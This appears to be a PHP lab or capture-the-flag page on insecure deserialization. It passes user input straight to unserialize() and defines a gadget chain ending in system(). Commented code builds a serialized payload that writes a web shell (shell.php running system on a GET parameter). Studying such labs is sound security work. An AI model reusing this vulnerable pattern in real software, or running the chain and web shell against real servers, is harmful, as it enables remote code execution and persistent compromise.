<title>Insecure Deserialization</title>
<a href="?src">View source</a>
<?php

class Execute {
  public $filename;

  public function exe($cmd){
    system($cmd);
  }

  public function __construct($filename){
    $this->filename = $filename;
  }

  public function __get($key){
    $this->exe($this->filename);
  }
}

class WakeUp {

  public $name;
  public $age;

  public function __toString(){
    return $this->getAge();
  }

  public function __wakeup(){
    echo "Hello". $this->name;
  }

  public function getAge(){
    return $this->age->trigger;
  }
}

if(isset($_GET['src'])){
  highlight_file(__FILE__);
}

if (isset($_GET['data'])){
  $data = $_GET['data'];
  unserialize($data);
}

// /*
// $a = new WakeUp();
// $a -> name = new WakeUp(); // trigger __toString()
// $a -> name -> age = new Execute("dir"); // trigger __get()
// $b = serialize($a);
// unserialize($b);

/*
$a = new WakeUp();
$a -> name = new WakeUp(); // trigger __toString()
$a -> name -> age = new Execute("echo \"<?php echo system(\$_GET['c']) ?>\" > shell.php"); // trigger __get()
$b = serialize($a);
// unserialize($b);
var_dump($b);
*/